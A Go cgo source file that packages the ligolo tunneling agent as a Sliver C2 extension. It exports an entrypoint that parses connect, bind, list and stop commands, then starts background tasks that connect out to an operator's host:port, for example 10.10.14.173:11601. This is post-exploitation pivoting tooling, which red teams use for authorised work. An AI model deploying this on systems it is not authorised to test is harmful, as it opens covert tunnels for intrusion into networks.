//go:build cgo

package main

/*
#include <stdint.h>
#include <stdlib.h>

#if defined(_WIN32) && defined(__i386__)
#define SLIVER_CALLBACK __attribute__((stdcall))
#else
#define SLIVER_CALLBACK
#endif

typedef int32_t (SLIVER_CALLBACK *sliver_callback_t)(char *, int32_t);

static int32_t sliver_call_callback(sliver_callback_t cb, char *data, int32_t len) {
	return cb(data, len);
}
*/
import "C"

import (
	"context"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"
)

// entrypoint implements the Sliver native extension ABI:
//
//	int32_t entrypoint(char *buffer, uint32_t size, callback(char *, int32_t))
//
// The agent runs in its own goroutine, so the call returns as soon as the task
// is started and Sliver gets its response immediately.
//
//export entrypoint
func entrypoint(buffer *C.char, size C.uint32_t, callback C.sliver_callback_t) C.int32_t {
	args := ""
	if buffer != nil && size > 0 {
		args = C.GoStringN(buffer, C.int(size))
	}
	out, err := dispatch(strings.Fields(args))
	if err != nil {
		return respond(callback, "ligolo error: "+err.Error(), 1)
	}
	return respond(callback, out, 0)
}

func respond(callback C.sliver_callback_t, msg string, rc C.int32_t) C.int32_t {
	if callback != nil {
		cs := C.CString(msg)
		defer C.free(unsafe.Pointer(cs))
		C.sliver_call_callback(callback, cs, C.int32_t(len(msg)))
	}
	return rc
}

// sliverTask is one running agent connection loop.
type sliverTask struct {
	id      uint32
	command string
	cancel  context.CancelFunc
	errCh   chan error
}

var (
	taskMu sync.Mutex
	tasks  = map[uint32]*sliverTask{}
	lastID uint32
)

func dispatch(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: connect <host:port> [flags] | bind <ip:port> [flags] | list | stop <taskId>")
	}
	switch args[0] {
	case "list":
		return listTasks(), nil
	case "stop":
		return stopTask(args[1:])
	case "connect", "bind":
		if len(args) < 2 {
			return "", fmt.Errorf("%s needs an address, e.g. %s 10.10.14.173:11601", args[0], args[0])
		}
		// Translate the Sliver subcommand into ligolo's flag form.
		return startTask(append([]string{"-" + args[0], args[1]}, args[2:]...))
	}
	return "", fmt.Errorf("unknown command %q, use connect, bind, list or stop", args[0])
}

func startTask(args []string) (string, error) {
	ctx, cancel := context.WithCancel(context.Background())
	task := &sliverTask{
		command: strings.Join(args, " "),
		cancel:  cancel,
		errCh:   make(chan error, 1),
	}

	go func() {
		defer func() {
			if r := recover(); r != nil {
				task.errCh <- fmt.Errorf("agent panic: %v", r)
			}
		}()
		task.errCh <- runContext(ctx, args)
	}()

	// The agent runs until the connection is lost, so report only an immediate
	// argument or connection error. Sliver's callback is valid during this call.
	select {
	case err := <-task.errCh:
		cancel()
		if err != nil {
			return "", err
		}
		return "", fmt.Errorf("agent exited immediately, check the arguments")
	case <-time.After(2 * time.Second):
	}

	taskMu.Lock()
	lastID++
	task.id = lastID
	tasks[task.id] = task
	taskMu.Unlock()

	return fmt.Sprintf("task %d started: ligolo %s", task.id, task.command), nil
}

func stopTask(args []string) (string, error) {
	if len(args) < 1 {
		return "", fmt.Errorf("usage: stop <taskId>")
	}
	id, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid taskId %q", args[0])
	}

	taskMu.Lock()
	task, ok := tasks[uint32(id)]
	if ok {
		delete(tasks, uint32(id))
	}
	taskMu.Unlock()
	if !ok {
		return "", fmt.Errorf("no task %d", id)
	}

	task.cancel()
	return fmt.Sprintf("task %d stopped\n%s", id, listTasks()), nil
}

func listTasks() string {
	taskMu.Lock()
	defer taskMu.Unlock()
	if len(tasks) == 0 {
		return "no running tasks"
	}
	ids := make([]uint32, 0, len(tasks))
	for id := range tasks {
		ids = append(ids, id)
	}
	sort.Slice(ids, func(i, j int) bool { return ids[i] < ids[j] })

	var b strings.Builder
	for _, id := range ids {
		fmt.Fprintf(&b, "taskID=%d command=ligolo %s\n", id, tasks[id].command)
	}
	return strings.TrimSuffix(b.String(), "\n")
}
